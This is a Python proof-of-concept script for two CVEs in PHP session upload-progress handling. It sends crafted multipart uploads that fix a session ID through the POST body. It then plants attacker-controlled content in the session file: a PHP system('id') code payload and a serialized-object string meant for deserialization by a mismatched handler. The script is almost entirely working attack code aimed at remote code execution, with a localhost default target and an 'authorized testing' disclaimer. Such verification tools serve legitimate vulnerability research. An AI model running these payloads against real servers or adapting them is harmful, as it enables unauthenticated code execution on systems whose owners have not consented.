#!/usr/bin/env python3
"""
CVE-2026-109618/109619 — Verify session file injection via upload_progress filename.

Demonstrates:
  1. Session fixation via POST body PHPSESSID (bypasses use_only_cookies)
  2. Unvalidated filename stored raw in session file (can contain PHP code)
  3. Session file created with attacker-controlled content

Usage:
  python3 verify_session_injection.py --target http://127.0.0.1:18080

For authorized security testing only.
"""

import argparse
import socket
import sys
import uuid
from urllib.parse import urlparse

from lib import send_http, parse_target


def send_upload(host: str, port: int, path: str, sid: str, filename: str, tls: bool = False):
    boundary = "VERIFY"
    body = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n{sid}\r\n'
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nx\r\n'
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="f"; filename="{filename}"\r\n\r\nZ\r\n'
        f"--{boundary}--\r\n"
    ).encode("latin-1")

    return send_http(host, port, "POST", path, tls,
                     headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
                     body=body,
                     cookies={"PHPSESSID": sid})


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", default="http://127.0.0.1:18080")
    ap.add_argument("--path", default="/index.php")
    ap.add_argument("--sid", default="verifysession00000000000000")
    ap.add_argument("--verbose", "-v", action="store_true")
    args = ap.parse_args()

    u = urlparse(args.target)
    host = u.hostname
    port = u.port or 80
    tls = u.scheme == 'https'

    print("[*] CVE-2026-109618/109619 — Session Injection Verification")
    print(f"[*] Target: {args.target}")
    print()

    # Test 1: Normal filename
    print("[1] Testing normal filename...")
    sid1 = args.sid + "a"
    resp = send_upload(host, port, args.path, sid1, "normal.txt", tls)
    if args.verbose and resp:
        print(f"    Response: {resp.split(b'\r\n', 1)[0].decode('latin-1', 'replace')}")
    print("    → Session file should contain: s:10:\"normal.txt\"")

    # Test 2: PHP code in filename
    php_payload = "<?php system('id');echo 'RCE';?>"
    print(f"[2] Testing PHP code in filename: {php_payload}")
    sid2 = args.sid + "b"
    resp = send_upload(host, port, args.path, sid2, php_payload, tls)
    if args.verbose and resp:
        print(f"    Response: {resp.split(b'\r\n', 1)[0].decode('latin-1', 'replace')}")
    print(f"    → Session file should contain PHP code as raw string")

    # Test 3: Pipe character in filename (for handler mismatch)
    pipe_payload = "x|O:8:\"stdClass\":0:{}"
    print(f"[3] Testing pipe + serialized object in filename")
    sid3 = args.sid + "c"
    # Need \" escaping for Content-Disposition
    escaped = pipe_payload.replace('"', '\\"')
    resp = send_upload(host, port, args.path, sid3, escaped, tls)
    if args.verbose and resp:
        print(f"    Response: {resp.split(b'\r\n', 1)[0].decode('latin-1', 'replace')}")
    print(f"    → Session file should contain |O:8: in the filename field")

    print()
    print("[*] Verification complete. Check session files on the target:")
    for suffix in ["a", "b", "c"]:
        sid = args.sid + suffix
        print(f"    cat /tmp/sessions/sess_{sid}")
    print()
    print("[*] Key indicators:")
    print("    - Session fixation: file created with attacker-controlled SID")
    print("    - Filename injection: raw PHP code / serialized objects in session data")
    print("    - No authentication required")


if __name__ == "__main__":
    main()
